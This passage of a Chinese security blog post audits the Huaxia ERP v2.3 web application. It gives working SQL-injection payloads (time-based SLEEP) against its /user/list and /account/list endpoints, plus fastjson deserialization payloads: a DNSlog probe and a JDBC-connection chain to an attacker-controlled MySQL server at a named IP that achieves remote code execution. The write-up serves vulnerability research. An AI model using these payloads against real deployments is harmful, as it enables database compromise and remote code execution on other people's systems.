+<p>传入下面 payload，但是发现并没有成功延时</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/account/list?search=%7b%22%6e%61%6d%65%22%3a%22%22%2c%22%73%65%72%69%61%6c%4e%6f%22%3a%22%22%2c%22%72%65%6d%61%72%6b%22%3a%22%31%27%4f%52%20%73%6c%65%65%70%28%34%29%2d%2d%20%22%7d&amp;pageSize=1&amp;currentPage=1</span></span></code></pre></div></div><p>看日志内容，发现是执行了 sql 语句的，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512221803917.png" /></p>
+<p>但是因为括号的原因导致我们的 sleep 命令没有成功，然后尝试进行闭合括号，但是又会报错，因为其实在执行这个 sql 语句前面还有 sql 语句的构造，会根据 xml 文件进行构造，前面因为括号没有闭合报错导致不能到这步，尝试绕过了半天没有绕过。</p>
+<p>没办法，只有换其他点继续审计了，在 UserMapperEx.xml 文件中，同样因为模糊查询使用了 <code>${}</code> 形式没有进行预编译，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512194948359.png" /></p>
+<p>还是从 Userservice 一直逆，同样来到这里</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512201414136.png" /></p>
+<p>最后还是在 ResourceController 中进行了调用，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512210637765.png" /></p>
+<p>还是构造如下 payload</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/user/list?search={&#34;userName&#34;:&#34;&#34;,&#34;loginName&#34;:&#34;&#39; AND SLEEP(5)--&#34;}&amp;pageSize=1&amp;currentPage=12</span></span></code></pre></div></div><p>看到成功延时</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211227459.png" /></p>
+<p>看看其 sql 语句，因为没有括号的限制导致直接就能执行 sleep。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="k">user</span><span class="p">.</span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">jsh_user</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">jsh_user_business</span><span class="w"> </span><span class="n">ub</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ub</span><span class="p">.</span><span class="n">key_id</span><span class="w"> </span><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">jsh_orga_user_rel</span><span class="w"> </span><span class="n">rel</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">rel</span><span class="p">.</span><span class="n">tenant_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">132</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rel</span><span class="p">.</span><span class="n">user_id</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ifnull</span><span class="p">(</span><span class="n">rel</span><span class="p">.</span><span class="n">delete_flag</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">jsh_organization</span><span class="w"> </span><span class="n">org</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="n">tenant_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">132</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">rel</span><span class="p">.</span><span class="n">orga_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ifnull</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="n">org_stcd</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;5&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">tenant_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">132</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ifnull</span><span class="p">(</span><span class="k">user</span><span class="p">.</span><span class="n">status</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;2&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">login_name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span></span></span></code></pre></div></div><p>其他的功能点其实也是差不多的，需要多试试。</p>
+<h2 id="fastjosn-反序列化">fastjosn 反序列化</h2>
+<p>因为用了 fastjson 的依赖，版本为 1.2.55，可以利用 1.2.68 的 payload 进行一个通杀。</p>
+<p>全局搜索下面关键词</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">parseObject</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JSONObject</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JSONObject</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span></span></span></code></pre></div></div><p>结果有点多，还是一个一个排查，找参数可控的</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512222914809.png" /></p>
+<p>其中在 <code>getInfo</code> 中有进行反序列化方法的调用，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223525304.png" /></p>
+<p>调用这个方法的地方很多，比如在上面的 <code>getUserList</code> 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512223732618.png" /></p>
+<p>明显 search 可控，构造一个 urldns 的请求，payload 如下</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;d84dfa38.log.dnslog.myfw.us.&#34;}</span></span></code></pre></div></div><p>成功收到 dns 解析，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513125133538.png" /></p>
+<p>但是版本是 1.2.55，无法利用 1.2.47 得进行通杀，可以利用 1.2.68 得 payload 进行通杀，因为还有 mysql 的依赖，可以打 jdbc，但是打 jdbc 需要反序列化链（或者读文件），感觉的化应该用 spring aop 链可以打，但是懒得弄了，直接添加个 cc 依赖尝试。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span></span></span></code></pre></div></div><p>然后 vps 上启个恶意的 mysqlserver</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160452519.png" /></p>
+<p>fastjson1.2.68 的 jdbc payload（需要根据 mysql 的版本选择）</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mysql.jdbc.JDBC4Connection&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;hostToConnectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;47.109.156.81&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;portToConnectTo&#34;</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;info&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;cc6&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;pass&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;statementInterceptors&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;autoDeserialize&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;NUM_HOSTS&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;databaseToConnectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;dbname&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;url&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>最后成功弹出计算机，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250513160604337.png" /></p>
+<p>只不过这里的 cc 依赖是自己添加的，只是为了证明可以打，实际可以打 spring aop 链。</p>
+<p>后面看到好像还有 Hikari 库，可以直接打 jndi（不过需要 atuotype 为 true 才行）。</p>
+<h2 id="总结">总结</h2>
+<p>参考：<a href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/#5-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE" target="_blank" rel="noopener noreffer ">https://drun1baby.top/2022/09/30/Java-代码审计之华夏-ERP-CMS-V2.3/#5-Fastjson-反序列化-RCE</a></p>
+<p>参考：<a href="https://xilitter.github.io/2024/04/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP-v2-3/index.html" target="_blank" rel="noopener noreffer ">https://xilitter.github.io/2024/04/30/java代码审计-华夏ERP-v2-3/index.html</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2025-04-26</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/%E5%8D%8E%E5%A4%8Fcms/" data-title="华夏 ERP CMS v2.3代码审计" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E5%8D%8E%E5%A4%8Fcms/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/apacheofbiz/" class="prev" rel="prev" title="Apache OfBiz 反序列化命令（CVE-2020-9496）"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Apache OfBiz 反序列化命令（CVE-2020-9496）</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
